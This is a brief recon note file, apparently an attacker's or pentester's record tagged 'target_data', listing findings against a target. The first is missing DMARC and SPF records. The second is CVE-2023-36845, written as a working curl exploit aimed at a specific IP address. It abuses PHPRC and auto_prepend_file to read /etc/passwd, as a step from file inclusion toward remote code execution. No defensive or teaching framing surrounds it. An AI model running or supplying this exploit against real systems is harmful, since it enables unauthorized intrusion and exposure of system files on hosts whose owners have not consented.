---
tags:
  - target_data
---
1. Missing `DMARC` records -> Missing `spf` records-> Mail Server Misconfiguration leads
2. CVE-2023-36845 -> LFI to RCE -> `curl --insecure "https://195.144.106.238/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`